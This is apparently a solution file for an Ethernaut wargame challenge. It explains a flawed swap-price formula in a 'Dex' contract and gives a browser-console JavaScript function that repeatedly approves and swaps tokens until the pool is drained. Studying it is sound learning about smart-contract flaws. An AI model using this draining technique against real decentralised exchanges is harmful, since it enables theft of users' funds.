// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xB704E688279b8ccc3073f7BD8BC70962b178aD7f

// solution

// because how the balance to swap is calculated, each time we swap the maximum amount possible, we are going to receive 
// more balance than the one we swapped, so we repeat the process until the dex contract drains on of the two tokens balance

// run this function in the chrome dev console and accept the transactions until one of the tokens get drained

async function drain() {
  try {
    const addressToken1 = await contract.token1();
    const addressToken2 = await contract.token2();

    // dex contract balance for each token
    let token1 = (await contract.balanceOf(addressToken1, contract.address)).toNumber();
    let token2 = (await contract.balanceOf(addressToken2, contract.address)).toNumber();

    while (token1 && token2) {
      // swap from the token in which the dex contract has lower balance
      const min = token1 < token2 ? token1 : token2;
      const from = token1 < token2 ? addressToken1 : addressToken2;
      const to = token1 < token2 ? addressToken2 : addressToken1;

      // how much to swap (the maximum possible)
      let amount = (await contract.balanceOf(from, player)).toNumber();

      // if the max amount is higher than the minimum of the dex tokens balance, use that minimum value
      amount = amount > min ? min : amount;

      // approve the dex contract to swap that amount
      await contract.approve(contract.address, amount);
      
      await contract.swap(from, to, amount);

      // update dex contract balance for each token
      token1 = (await contract.balanceOf(addressToken1, contract.address)).toNumber();
      token2 = (await contract.balanceOf(addressToken2, contract.address)).toNumber();
    }
  } catch (e) {
    console.error(e);
  }
}